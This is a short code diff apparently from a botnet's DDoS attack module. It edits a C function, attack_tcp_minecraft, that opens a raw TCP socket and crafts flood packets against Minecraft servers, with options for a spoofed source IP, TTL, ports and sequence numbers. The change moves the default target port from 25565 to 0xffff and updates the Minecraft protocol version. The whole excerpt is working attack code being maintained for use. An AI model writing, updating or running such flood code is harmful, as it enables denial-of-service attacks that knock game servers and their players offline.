@@ -936,14 +936,14 @@ void attack_tcp_minecraft(uint8_t targs_len, struct attack_target *targs, uint8_
     uint8_t ip_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 64);
     BOOL dont_frag = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_DF, FALSE);
     port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
-    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 25565); // Minecraft default
+    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff); 
     uint32_t seq = attack_get_opt_int(opts_len, opts, ATK_OPT_SEQRND, 0xffff);
     uint32_t ack = attack_get_opt_int(opts_len, opts, ATK_OPT_ACKRND, 0xffff);
     uint32_t source_ip = attack_get_opt_ip(opts_len, opts, ATK_OPT_SOURCE, LOCAL_ADDR);
     
-    // Fixed values for Minecraft
-    int protocol_version = 763; // Minecraft 1.20.1 protocol version
-    int data_len = 150; // Fixed payload size for handshake + login
+    // values for minecraft
+    int protocol_version = 764; // 1.21 
+    int data_len = 150; // respect 
 
     if ((fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
     {
